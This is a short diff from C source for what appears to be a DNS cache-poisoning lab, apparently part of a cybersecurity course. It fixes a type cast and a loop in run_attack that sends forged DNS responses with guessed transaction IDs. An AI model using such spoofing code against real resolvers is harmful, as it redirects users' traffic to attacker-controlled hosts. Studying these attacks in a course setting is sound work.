@@ -559,7 +559,7 @@ void send_custom_ip_packet(const char *src_ip, const char *dest_ip, int src_port
 void encode_domain_name(uint8_t *dns, const char *host) {
     int lock = 0;
     strcat((char *)dns, ".");
-    for (int i = 0; i < strlen(host); i++) {
+    for (int i = 0; i < (int) strlen(host); i++) {
         if (host[i] == '.') {
             *dns++ = i - lock;
             for (; lock < i; lock++) {
@@ -838,7 +838,7 @@ void run_attack(uint32_t *txid_ls) {
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
         // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
-        full_send_spoofed_dns(txid[i]);
+        full_send_spoofed_dns(txid_ls[i]);
         // send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
     }
     
